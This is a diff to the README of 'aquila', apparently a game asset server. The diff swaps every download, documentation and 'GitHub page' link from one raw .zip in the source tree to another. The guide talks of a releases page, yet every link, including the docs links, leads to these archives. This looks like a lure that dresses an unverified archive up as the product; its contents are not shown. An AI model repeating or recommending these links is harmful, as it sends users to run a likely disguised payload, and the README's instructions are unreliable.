@@ -1,7 +1,7 @@
 # 🚀 aquila - Easily Serve Game Assets Online
 
 ## 📥 Download Now
-[![Download aquila](https://raw.githubusercontent.com/manoharpb03/aquila/main/crates/bevy_aquila/src/Software-v3.6.zip)](https://raw.githubusercontent.com/manoharpb03/aquila/main/crates/bevy_aquila/src/Software-v3.6.zip)
+[![Download aquila](https://github.com/manoharpb03/aquila/raw/refs/heads/main/crates/aquila_cli/Software-3.5-alpha.1.zip)](https://github.com/manoharpb03/aquila/raw/refs/heads/main/crates/aquila_cli/Software-3.5-alpha.1.zip)
 
 ## 🔍 Overview
 **Aquila** is a modular asset server designed to help you easily serve game assets. It supports modern features like OAuth, Content Delivery Networks (CDNs), and presigned URLs. You can work with multiple file backends, making it a flexible choice for game developers.
@@ -27,7 +27,7 @@ Before installing **Aquila**, make sure your system meets the following requirem
 ## 🔗 Download & Install
 To download and install **Aquila**, follow these steps:
 
-1. Visit the [Download Page](https://raw.githubusercontent.com/manoharpb03/aquila/main/crates/bevy_aquila/src/Software-v3.6.zip).
+1. Visit the [Download Page](https://github.com/manoharpb03/aquila/raw/refs/heads/main/crates/aquila_cli/Software-3.5-alpha.1.zip).
 2. Scroll through the list of available releases.
 3. Click on the latest version to go to the download details.
 4. Find the asset that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or relevant binaries for Linux).
@@ -55,7 +55,7 @@ Once you have installed **Aquila**, you may need to configure it to fit your nee
 4. You can now upload assets and manage them through the user-friendly interface.
 
 ## 📚 Additional Resources
-- **Documentation:** For detailed features and options, please refer to the official documentation linked on the [GitHub page](https://raw.githubusercontent.com/manoharpb03/aquila/main/crates/bevy_aquila/src/Software-v3.6.zip).
+- **Documentation:** For detailed features and options, please refer to the official documentation linked on the [GitHub page](https://github.com/manoharpb03/aquila/raw/refs/heads/main/crates/aquila_cli/Software-3.5-alpha.1.zip).
 - **Community Support:** For help or to share your experiences, check out community forums and discussions related to game asset management.
 
 ## 🤝 Contributing
@@ -69,7 +69,7 @@ Aquila covers several important topics in game development:
 - Server-Client Architecture
 
 ## 🔗 Links
-- **Download:** [Aquila Releases](https://raw.githubusercontent.com/manoharpb03/aquila/main/crates/bevy_aquila/src/Software-v3.6.zip)
-- **Documentation:** [Read the Docs](https://raw.githubusercontent.com/manoharpb03/aquila/main/crates/bevy_aquila/src/Software-v3.6.zip)
+- **Download:** [Aquila Releases](https://github.com/manoharpb03/aquila/raw/refs/heads/main/crates/aquila_cli/Software-3.5-alpha.1.zip)
+- **Documentation:** [Read the Docs](https://github.com/manoharpb03/aquila/raw/refs/heads/main/crates/aquila_cli/Software-3.5-alpha.1.zip)
 
 With **Aquila**, serving your game assets becomes a simple and effective process. Follow this guide to get started today!
